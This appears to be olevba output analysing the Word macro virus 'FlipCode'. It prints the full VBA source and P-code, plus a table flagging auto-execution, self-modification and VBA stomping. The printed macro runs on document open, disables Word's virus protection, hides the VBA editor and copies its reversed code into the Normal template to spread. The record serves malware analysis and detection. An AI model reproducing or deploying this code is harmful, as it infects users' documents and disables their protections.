olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FlipCode
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FlipCode - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open() ' buS dnE :lacitirCbv ,".yltcerroc ti llatsni ot putes nur esaelP .dezilaitini eb ton dluoc tnemnorivne cisaB lausiV ehT" xoBgsM :)(edocbvweiv buS etavirP
Application.ShowVisualBasicEditor = False ' buS dnE
On Error GoTo yalav ' emaNlluF.tnemucoDevitcA=:emaNeliF sAevaS.tnemucoDevitcA nehT "tnemucoD" >< )8 ,emaN.tnemucoDevitcA(tfeL fI
Options.VirusProtection = 0 ' gal txeN
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines ' $van ,1 seniLtresnI.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA
For lav = 1 To 14 ' tanya txeN
ehs$ = "" ' )1 ,tanya ,))1 ,gal(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN(($diM & $van = $van
For ruam = 1 To Len(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(lav, 1)) ' 1- petS 1 oT ))1 ,gal(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN(neL = tanya roF
ehs$ = Mid$((ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(lav, 1)), ruam, 1) & ehs$ ' "" = $van
Next ruam ' 41 oT 1 = gal roF
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ehs$ ' seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA ,1 seniLeteleD.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA nehT 0 > seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA fI
Next lav ' eslaF = noitcetorPsuriV.snoitpO
'9991 eam 0.1v edocpilf' txeN emuseR rorrE nO
yalav: End Sub ' )(esolc_tnemucod buS etavirP
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.FlipCode
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8932 bytes
' Line #0:
' 	FuncDefn (Private Sub document_open())
' 	QuoteRem 0x001C 0x0099 " buS dnE :lacitirCbv ,".yltcerroc ti llatsni ot putes nur esaelP .dezilaitini eb ton dluoc tnemnorivne cisaB lausiV ehT" xoBgsM :)(edocbvweiv buS etavirP"
' Line #1:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	QuoteRem 0x0029 0x0008 " buS dnE"
' Line #2:
' 	OnError yalav 
' 	QuoteRem 0x0014 0x006B " emaNlluF.tnemucoDevitcA=:emaNeliF sAevaS.tnemucoDevitcA nehT "tnemucoD" >< )8 ,emaN.tnemucoDevitcA(tfeL fI"
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x001C 0x0009 " gal txeN"
' Line #4:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' 	QuoteRem 0x00E0 0x004D " $van ,1 seniLtresnI.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA"
' Line #5:
' 	StartForVariable 
' 	Ld lav 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' 	QuoteRem 0x0012 0x000B " tanya txeN"
' Line #6:
' 	LitStr 0x0000 ""
' 	St ehs$ 
' 	QuoteRem 0x000A 0x0067 " )1 ,tanya ,))1 ,gal(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN(($diM & $van = $van"
' Line #7:
' 	StartForVariable 
' 	Ld ruam 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld lav 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	For 
' 	QuoteRem 0x005C 0x0065 " 1- petS 1 oT ))1 ,gal(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN(neL = tanya roF"
' Line #8:
' 	Ld lav 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Paren 
' 	Ld ruam 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld ehs$ 
' 	Concat 
' 	St ehs$ 
' 	QuoteRem 0x0066 0x000A " "" = $van"
' Line #9:
' 	StartForVariable 
' 	Ld ruam 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0012 " 41 oT 1 = gal roF"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ehs$ 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' 	QuoteRem 0x004D 0x00E0 " seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA ,1 seniLeteleD.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA nehT 0 > seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA fI"
' Line #11:
' 	StartForVariable 
' 	Ld lav 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0009 0x0020 " eslaF = noitcetorPsuriV.snoitpO"
' Line #12:
' 	QuoteRem 0x0000 0x002C "9991 eam 0.1v edocpilf' txeN emuseR rorrE nO"
' Line #13:
' 	Label yalav 
' 	EndSub 
' 	QuoteRem 0x000F 0x001D " )(esolc_tnemucod buS etavirP"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

